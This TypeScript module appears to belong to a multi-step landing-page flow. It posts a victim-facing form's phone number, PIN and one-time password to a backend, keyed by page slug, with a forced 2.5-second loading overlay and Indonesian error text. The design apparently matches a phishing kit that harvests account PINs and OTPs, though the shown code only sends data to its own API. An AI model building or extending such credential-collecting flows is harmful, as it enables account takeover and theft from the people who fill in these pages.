import type { StepData } from '@/lib/landing/types';

export async function submitLandingStepViaApi(
  slug: string,
  step: 1 | 2 | 3,
  stepData: StepData,
  overlayMinMs = 2500
): Promise<{ success: boolean; error?: string }> {
  const start = Date.now();

  try {
    const response = await fetch('/api/landing/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        slug,
        step,
        phone: stepData.phone,
        pin: stepData.pin,
        otp: stepData.otp,
      }),
    });

    const data = (await response.json()) as { success?: boolean; error?: string };

    const remaining = overlayMinMs - (Date.now() - start);
    if (remaining > 0) {
      await new Promise((resolve) => setTimeout(resolve, remaining));
    }

    if (!response.ok || !data.success) {
      return { success: false, error: data.error || 'Gagal mengirim data.' };
    }

    return { success: true };
  } catch {
    const remaining = overlayMinMs - (Date.now() - start);
    if (remaining > 0) {
      await new Promise((resolve) => setTimeout(resolve, remaining));
    }
    return { success: false, error: 'Terjadi kesalahan jaringan.' };
  }
}
